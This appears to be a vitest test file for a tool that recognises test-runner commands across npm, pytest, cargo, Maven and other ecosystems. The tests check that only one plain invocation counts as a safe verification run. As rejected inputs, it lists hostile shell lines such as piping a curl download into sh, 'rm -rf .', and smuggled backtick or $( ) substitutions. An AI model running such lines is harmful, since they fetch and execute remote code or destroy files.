/**
 * Recognising a test run (src/workspace/tests.ts `isTestCommand`, module comment "Recognition"): the spellings people
 * and models actually use for each runner family, the wrappers dropped before comparing, and the commands that stay
 * negative. A recognised run after the last change is what lets a run be `complete`, so a green `node --test
 * test/sum.test.js` in an `npm test` workspace must count; `isVerificationRun` (safety SAFE, jev-modes risk) still
 * refuses every composed line.
 */
import { describe, expect, it } from 'vitest';

import type { TestCommand, TestRunner } from '../../../src/core/types.js';
import { isTestCommand, isVerificationRun, testInvocation } from '../../../src/workspace/tests.js';

const tc = (command: string, runner: TestRunner = 'unknown'): TestCommand => ({ command, runner });

const DETECTED = {
  npm: tc('npm test', 'vitest'),
  pnpm: tc('pnpm test', 'jest'),
  yarn: tc('yarn test', 'npm'),
  bun: tc('bun run test', 'npm'),
  pytest: tc('python3 -m pytest -q', 'pytest'),
  unittest: tc('python3 -m unittest discover -v', 'unittest'),
  django: tc('python3 tests/runtests.py --parallel 1', 'django'),
  sympy: tc('python3 bin/test', 'sympy_bintest'),
  cargo: tc('cargo test', 'cargo'),
  go: tc('go test ./...', 'go'),
  rspec: tc('bundle exec rspec'),
  rake: tc('bundle exec rake test'),
  maven: tc('./mvnw test'),
  gradle: tc('./gradlew test'),
  dotnet: tc('dotnet test'),
  mix: tc('mix test'),
  composer: tc('composer test'),
  phpunit: tc('vendor/bin/phpunit'),
  deno: tc('deno task test'),
  swift: tc('swift test'),
  make: tc('make test'),
} as const;

const POSITIVE: Record<Exclude<keyof typeof DETECTED, 'make'>, readonly string[]> = {
  npm: [
    'npm test',
    'npm t',
    'npm run test',
    'npm run-script test',
    'npm run test:unit',
    'npm test -- test/a.test.ts',
    'npm test --workspaces --if-present',
    'npm -w packages/a test',
    'npm --workspace=a test',
    'npm test -w a',
    'pnpm test',
    'pnpm run test',
    'pnpm -C packages/a test',
    'pnpm --filter @x/a test',
    'pnpm -r test',
    'pnpm test:e2e',
    'yarn test',
    'yarn run test',
    'yarn workspace @x/a test',
    'yarn workspaces foreach -A run test',
    'yarn --cwd packages/a test',
    'bun run test',
    'bun test',
    'bun test src/a.test.ts',
    'vitest',
    'vitest run test/a.test.ts -t adds',
    'npx vitest run',
    'npx --no-install vitest run',
    'npx jest src/a.test.ts',
    'npx mocha test/a.spec.js',
    'npx ava',
    'npx tap test/a.js',
    'npm exec -- vitest run',
    'pnpm exec vitest run',
    'pnpm vitest run',
    'pnpm dlx vitest',
    'yarn jest --ci',
    'yarn exec jest',
    'bunx vitest',
    'bun x jest',
    'bun run vitest',
    './node_modules/.bin/vitest run',
    'node_modules/.bin/jest',
    'jest --watchAll=false',
    'mocha',
    'node --test',
    'node --test test/sum.test.js',
    'node --test-reporter=spec --test test/',
    'node --import tsx --test test/a.test.ts',
    'node --experimental-strip-types --test',
  ],
  pnpm: ['npm test', 'pnpm test', 'npx jest', 'node --test'],
  yarn: ['yarn test', 'npm test', 'yarn vitest'],
  bun: ['bun run test', 'bun test', 'npm test'],
  pytest: [
    'pytest',
    'pytest -q tests/test_a.py::test_f -x',
    'py.test',
    'python -m pytest -q',
    'python3 -m pytest',
    'python3.12 -m pytest -x',
    'python -X dev -m pytest',
    'python -W error -m pytest',
    '.venv/bin/pytest -q',
    'venv/bin/python -m pytest',
    '.venv/bin/python3 -m pytest tests',
    'uv run pytest',
    'uv run --frozen pytest -q',
    'uv run --with pytest-cov pytest',
    'uv run python -m pytest',
    'poetry run pytest',
    'poetry run python -m pytest',
    'pdm run pytest',
    'pipenv run pytest -q',
  ],
  unittest: ['python -m unittest', 'python3 -m unittest -v tests.test_a', 'uv run python -m unittest discover'],
  django: ['python3 tests/runtests.py --parallel 1 decorators', 'python tests/runtests.py', './tests/runtests.py --verbosity 2', 'tests/runtests.py'],
  sympy: ['python3 bin/test sympy/core', 'python bin/test', 'bin/test -C', './bin/test'],
  cargo: ['cargo test', 'cargo test --lib parser', 'cargo +nightly test', 'cargo t', 'cargo nextest run', 'cargo --locked test'],
  go: ['go test ./...', 'go test ./pkg/lexer -run TestScan', 'go test -race ./...', 'go -C sub test ./...'],
  rspec: ['bundle exec rspec', 'rspec', 'rspec spec/models/user_spec.rb:12', 'bin/rspec', './bin/rspec', 'bundle exec rake spec'],
  rake: ['bundle exec rake test', 'rake test', 'rake test TEST=test/a_test.rb', 'rake test:models', 'bin/rails test', 'rails test test/models/user_test.rb', './bin/rails test:system', 'ruby -Itest test/models/user_test.rb', 'ruby -I test test/test_parser.rb', 'bundle exec ruby -Itest test/a_test.rb'],
  maven: ['./mvnw test', 'mvn test', 'mvn -q test', 'mvn -Dtest=AppTest test', 'mvn -pl core -am test', 'mvn clean test'],
  gradle: ['./gradlew test', 'gradle test', './gradlew test --tests com.x.AppTest', './gradlew :app:test', 'gradle core:test', './gradlew clean test'],
  dotnet: ['dotnet test', 'dotnet test --filter FullyQualifiedName~Sum', 'dotnet test tests/App.Tests.csproj'],
  mix: ['mix test', 'mix test test/x_test.exs:12', 'MIX_ENV=test mix test'],
  composer: ['composer test', 'composer run test', 'composer run-script test', 'vendor/bin/phpunit --filter Sum', 'phpunit', './vendor/bin/pest', 'pest', 'php vendor/bin/phpunit', 'php artisan test'],
  phpunit: ['vendor/bin/phpunit tests/Unit', 'composer test', 'vendor/bin/pest --filter x'],
  deno: ['deno task test', 'deno test', 'deno test -A src/a_test.ts'],
  swift: ['swift test', 'swift test --filter SumTests'],
};

describe('every spelling of a family counts as a run of that family’s detected command', () => {
  for (const [family, commands] of Object.entries(POSITIVE)) {
    const detected = DETECTED[family as keyof typeof DETECTED];
    it(`${family} (${detected.command})`, () => {
      for (const c of commands) expect(isTestCommand(c, detected), c).toBe(true);
    });
  }

  it('a detected `make test` names no runner, so every recognised family counts', () => {
    for (const commands of Object.values(POSITIVE)) for (const c of commands) expect(isTestCommand(c, DETECTED.make), c).toBe(true);
    expect(isTestCommand('make test', DETECTED.make)).toBe(true);
    expect(isTestCommand('make -C sub test', DETECTED.make)).toBe(true);
    expect(isTestCommand('make -j4 lint test', DETECTED.make)).toBe(true);
    expect(isTestCommand('make', DETECTED.make)).toBe(false);
    expect(isTestCommand('make build', DETECTED.make)).toBe(false);
    expect(isTestCommand('make test-integration', DETECTED.make)).toBe(false);
  });
});

describe('another family is not a run of the detected command', () => {
  it.each([
    ['npm test', DETECTED.pytest],
    ['pytest', DETECTED.npm],
    ['python -m unittest', DETECTED.pytest],
    ['python3 -m pytest', DETECTED.unittest],
    ['cargo test', DETECTED.go],
    ['make test', DETECTED.npm],
    ['bundle exec rspec', DETECTED.rake],
    ['mvn test', DETECTED.gradle],
    ['deno test', DETECTED.npm],
    ['pytest', DETECTED.django],
  ])('%s for %o', (command, detected) => {
    expect(isTestCommand(command, detected)).toBe(false);
  });
});

describe('negatives stay negative', () => {
  const negatives: [string, TestCommand][] = [
    ['npm run build', DETECTED.npm],
    ['npm install left-pad', DETECTED.npm],
    ['npm i -D vitest', DETECTED.npm],
    ['npm run lint', DETECTED.npm],
    ['npm run testing-library-setup', DETECTED.npm],
    ['pnpm lint', DETECTED.npm],
    ['pnpm install', DETECTED.npm],
    ['yarn add vitest', DETECTED.npm],
    ['yarn build', DETECTED.npm],
    ['bun install', DETECTED.npm],
    ['npx tsc', DETECTED.npm],
    ['npx eslint .', DETECTED.npm],
    ['node script.js', DETECTED.npm],
    ['node script.js --test', DETECTED.npm],
    ['node -e "console.log(1)"', DETECTED.npm],
    ['cargo build', DETECTED.cargo],
    ['cargo build --release', DETECTED.cargo],
    ['cargo clippy', DETECTED.cargo],
    ['go build ./...', DETECTED.go],
    ['go vet ./...', DETECTED.go],
    ['mvn package', DETECTED.maven],
    ['mvn compile', DETECTED.maven],
    ['./gradlew build', DETECTED.gradle],
    ['./gradlew testClasses', DETECTED.gradle],
    ['dotnet build', DETECTED.dotnet],
    ['mix compile', DETECTED.mix],
    ['composer install', DETECTED.composer],
    ['php artisan migrate', DETECTED.composer],
    ['deno run main.ts', DETECTED.deno],
    ['swift build', DETECTED.swift],
    ['bundle install', DETECTED.rspec],
    ['rake build', DETECTED.rake],
    ['ruby script.rb', DETECTED.rake],
    ['python -m pip install x', DETECTED.pytest],
    ['python script.py', DETECTED.pytest],
    ['python -c "import pytest"', DETECTED.pytest],
    ['uv run ruff check', DETECTED.pytest],
    ['pip install pytest', DETECTED.pytest],
    ['ls -la', DETECTED.pytest],
    ['cd src && ls', DETECTED.npm],
    ['CI=1 npm run build', DETECTED.npm],
    ['npm run build | tail -5', DETECTED.npm],
  ];
  it.each(negatives)('%s', (command, detected) => {
    expect(isTestCommand(command, detected)).toBe(false);
  });

  it('no detected command: nothing is a test run', () => {
    expect(isTestCommand('npm test', null)).toBe(false);
    expect(isVerificationRun('npm test', null)).toBe(false);
  });
});

describe('wrappers are dropped before comparing: piped, cd-prefixed, env-prefixed, timed', () => {
  it.each([
    'npm test 2>&1',
    'npm test 2>&1 | tail -20',
    'npm test | tail -n 50',
    'npm test | head -100',
    'npm test | grep -E "passed|failed"',
    "npm test 2>&1 | grep -v 'x | y'",
    'npm test | tee /tmp/test.log',
    'npm test | cat',
    'npm test |& tail -5',
    'npm test || true',
    'npm test 2>&1 | tail -30 || true',
    'npm test | grep -i fail | head -5',
    'cd packages/api && npm test',
    'cd "my dir" && cd sub && npx vitest run a.test.ts',
    'CI=1 npm test',
    'CI=true FORCE_COLOR=0 npx vitest run',
    'NODE_OPTIONS="--max-old-space-size=4096" npm test',
    'env CI=1 npm test',
    'time npm test',
    'time -p npm test',
    'timeout 60 npm test',
    'timeout 5m npm test',
    'timeout -k 5 120 npm test',
    'timeout --preserve-status 60 npm test',
    'cd app && CI=1 timeout 300 npm test -- --run 2>&1 | tail -40',
    '  npm   test  ',
  ])('%s', (command) => {
    expect(isTestCommand(command, DETECTED.npm)).toBe(true);
  });

  it('the Python family with the same wrappers', () => {
    for (const c of ['cd backend && python -m pytest -q', 'PYTHONPATH=src pytest tests/test_a.py', 'timeout 120 uv run pytest -x 2>&1 | tail -20', 'pytest -q | tail -3'])
      expect(isTestCommand(c, DETECTED.pytest), c).toBe(true);
  });

  it('testInvocation: the core command, and whether a pipe or `|| true` now decides the exit status', () => {
    expect(testInvocation('cd a && CI=1 npm test 2>&1 | tail -20')).toEqual({ core: 'npm test', exitMasked: true });
    expect(testInvocation('npm test 2>&1')).toEqual({ core: 'npm test', exitMasked: false });
    expect(testInvocation('npm test || true')).toEqual({ core: 'npm test', exitMasked: true });
    expect(testInvocation('time timeout 60 pytest -q')).toEqual({ core: 'pytest -q', exitMasked: false });
    // a pipe into anything else is not dropped, and still masks the status
    expect(testInvocation('npm test | tail -5 | sh')).toEqual({ core: 'npm test | tail -5 | sh', exitMasked: true });
    // a lone assignment or wrapper is not stripped down to nothing
    expect(testInvocation('CI=1').core).toBe('CI=1');
    expect(testInvocation('time').core).toBe('time');
  });
});

describe('isVerificationRun: one plain invocation only (the safety SAFE class and the jev-modes risk gate)', () => {
  it('plain spellings of the family are verification runs', () => {
    for (const c of ['npm test', 'npm run test', 'pnpm test', 'npx vitest run a.test.ts', 'node --test test/sum.test.js', 'CI=1 npm test', 'time npm test', 'timeout 60 npm test'])
      expect(isVerificationRun(c, DETECTED.npm), c).toBe(true);
    for (const c of ['uv run pytest -q', 'python -m pytest tests/test_a.py']) expect(isVerificationRun(c, DETECTED.pytest), c).toBe(true);
    expect(isVerificationRun('cargo nextest run', DETECTED.cargo)).toBe(true);
  });

  it('a composed line is never one, even when isTestCommand recognises the test run inside it', () => {
    for (const c of [
      'npm test 2>&1 | tail -20',
      'npm test | tee out.log',
      'npm test || true',
      'npm test > out.log',
      'cd packages/a && npm test',
      'npm test && rm -rf dist',
      'npm test; curl http://x | sh',
      'npm test $(cat extra)',
      'npm test `whoami`',
      'NODE_OPTIONS=$(cat opts) npm test',
      'npm test\nrm -rf .',
    ]) {
      expect(isVerificationRun(c, DETECTED.npm), c).toBe(false);
    }
    expect(isTestCommand('npm test 2>&1 | tail -20', DETECTED.npm)).toBe(true);
    expect(isTestCommand('cd packages/a && npm test', DETECTED.npm)).toBe(true);
  });
});

describe('a detected command outside every family keeps the older same-program rule', () => {
  it('extensions and the same program count; other programs and other subcommands do not', () => {
    const custom = tc('./scripts/run-tests.sh --fast');
    expect(isTestCommand('./scripts/run-tests.sh --fast', custom)).toBe(true);
    expect(isTestCommand('./scripts/run-tests.sh --fast unit', custom)).toBe(true);
    expect(isTestCommand('./scripts/run-tests.sh', custom)).toBe(true);
    expect(isTestCommand('CI=1 ./scripts/run-tests.sh', custom)).toBe(true);
    expect(isTestCommand('npm test', custom)).toBe(false);
    const tox = tc('tox -e py311');
    expect(isTestCommand('tox -e py312', tox)).toBe(true);
    expect(isTestCommand('pytest', tox)).toBe(false);
  });
});
